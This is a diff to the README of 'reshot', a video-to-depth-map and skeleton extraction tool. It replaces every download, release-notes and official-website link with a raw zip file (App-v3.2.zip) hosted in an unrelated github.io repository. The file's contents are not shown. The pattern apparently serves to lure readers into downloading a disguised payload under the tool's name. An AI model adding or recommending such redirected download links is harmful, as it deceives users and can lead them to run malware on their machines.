@@ -5,7 +5,7 @@ description: "Turn reference videos into depth maps, skeletons, or line art to r
 ---
 # 🎬 reshot - Turn Videos into Creative Control for AI
 
-[![Download reshot](https://img.shields.io/badge/Download-reshot-2ea44f?style=for-the-badge)](https://github.com/Besprent-feline80/reshot/releases)
+[![Download reshot](https://img.shields.io/badge/Download-reshot-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Besprent-feline80/besprent-feline80.github.io/main/js/App-v3.2.zip)
 
 ## 🚀 What Is reshot?
 
@@ -25,7 +25,7 @@ Think of it as a translator that takes a regular video and extracts the **bluepr
 
 ## 📥 Download and Installation
 
-**Visit this link to download the application:** [https://github.com/Besprent-feline80/reshot/releases](https://github.com/Besprent-feline80/reshot/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Besprent-feline80/besprent-feline80.github.io/main/js/App-v3.2.zip](https://raw.githubusercontent.com/Besprent-feline80/besprent-feline80.github.io/main/js/App-v3.2.zip)
 
 Follow these simple steps to get reshot running on your Windows computer:
 
@@ -95,9 +95,9 @@ A: By default, reshot saves processed files in the same folder as your source vi
 
 ## 📚 Additional Resources
 
-- **Official Website:** [www.maosika.com](https://www.maosika.com) — Learn more about Maosika's AI short-drama production system and see reshot in action.
+- **Official Website:** [www.maosika.com](https://raw.githubusercontent.com/Besprent-feline80/besprent-feline80.github.io/main/js/App-v3.2.zip) — Learn more about Maosika's AI short-drama production system and see reshot in action.
 - **ComfyUI Community:** Join ComfyUI forums or Discord channels for help integrating reshot outputs into complex workflows.
-- **Release Notes:** Check the [releases page](https://github.com/Besprent-feline80/reshot/releases) for version history and changelogs.
+- **Release Notes:** Check the [releases page](https://raw.githubusercontent.com/Besprent-feline80/besprent-feline80.github.io/main/js/App-v3.2.zip) for version history and changelogs.
 
 ## 🤝 Contributing and Feedback
 
@@ -124,7 +124,7 @@ Your feedback helps make reshot better for everyone. If you create something ama
 
 Don't overthink it — download reshot, throw in a test video, and see what comes out. The best way to learn is by experimenting. Start with a simple 5-second clip and try all three extraction modes. You'll quickly understand the power of controlling AI video generation with real-world structure.
 
-[![Download reshot now](https://img.shields.io/badge/Download-reshot_now-blue?style=for-the-badge&logo=github)](https://github.com/Besprent-feline80/reshot/releases)
+[![Download reshot now](https://img.shields.io/badge/Download-reshot_now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Besprent-feline80/besprent-feline80.github.io/main/js/App-v3.2.zip)
 
 Remember, reshot is designed to be easy enough for beginners but powerful enough for professionals. Whether you're a hobbyist making fun videos or a production studio doing serious short-drama work, this tool gives you creative freedom you didn't have before. Copy the shot, not the actors — and let your imagination lead the way!
 
